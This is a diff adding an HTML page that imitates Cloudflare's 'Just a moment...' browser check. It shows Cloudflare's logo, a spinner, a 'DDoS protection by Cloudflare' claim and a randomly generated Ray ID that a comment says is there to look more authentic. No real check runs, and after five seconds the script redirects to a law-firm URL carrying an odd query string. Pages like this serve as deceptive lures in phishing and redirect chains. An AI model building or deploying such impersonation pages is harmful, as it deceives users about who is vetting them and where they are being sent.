@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cloudflare - Just a moment...</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            color: #333;
+        }
+        .logo {
+            width: 180px;
+            margin-bottom: 20px;
+        }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            margin-bottom: 20px;
+            border: 4px solid rgba(66, 133, 244, 0.1);
+            border-top: 4px solid #4285f4;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        .container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            max-width: 500px;
+            width: 90%;
+        }
+        h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        p {
+            color: #666;
+            margin-bottom: 20px;
+        }
+        .details {
+            font-size: 14px;
+            color: #888;
+            margin-top: 20px;
+        }
+        .ray-id {
+            font-family: monospace;
+            background-color: #f8f8f8;
+            padding: 2px 6px;
+            border-radius: 3px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://www.cloudflare.com/img/logo-cloudflare-dark.svg" alt="Cloudflare" class="logo">
+        
+        <h1>Just a moment...</h1>
+        <p>We're checking your browser before accessing the website.</p>
+        
+        <div class="spinner"></div>
+        
+        <p>This process is automatic. Your browser will redirect to your requested content shortly.</p>
+        <p>Please allow up to 5 seconds...</p>
+        
+        <div class="details">
+            DDoS protection by Cloudflare<br>
+            Ray ID: <span class="ray-id">78a6c0fece97fd21</span>
+        </div>
+    </div>
+
+    <script>
+        // This is a simulation only - in a real implementation, this would validate browser properties
+        // and redirect to the actual site. This is a safe dummy implementation.
+        
+        // Generate a random Ray ID to make it look more authentic
+        function generateRayId() {
+            const chars = '0123456789abcdef';
+            let result = '';
+            for (let i = 0; i < 16; i++) {
+                result += chars[Math.floor(Math.random() * chars.length)];
+            }
+            return result;
+        }
+        
+        document.querySelector('.ray-id').textContent = generateRayId();
+        
+        // Redirect to your final destination URL after delay
+        setTimeout(() => {
+            // Replace the URL below with your final destination URL
+            window.location.href = "https://jacovettlaw.com/?isajyiok";
+        }, 5000); // 5 second delay before redirect
+    </script>
+</body>
+</html>
